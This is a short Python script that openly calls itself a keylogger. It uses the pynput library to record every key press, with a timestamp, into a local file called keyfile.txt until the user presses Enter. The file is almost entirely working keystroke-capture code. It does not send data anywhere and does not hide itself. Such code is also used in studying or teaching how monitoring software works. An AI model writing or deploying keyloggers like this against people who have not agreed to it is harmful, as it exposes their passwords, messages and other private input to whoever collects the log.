import time
from pynput import keyboard

def keyPressed(key):
    current_time = time.time()
    with open("keyfile.txt", 'a') as logKey:
        try:
            logKey.write(f"{current_time} {key.__dict__}\n")  # Include the timestamp with each keystroke
        except AttributeError:  # Use AttributeError instead of a general exception
            print("Error getting char")

listener = keyboard.Listener(on_press=keyPressed)
listener.start()
input("Press Enter to stop the keylogger\n")
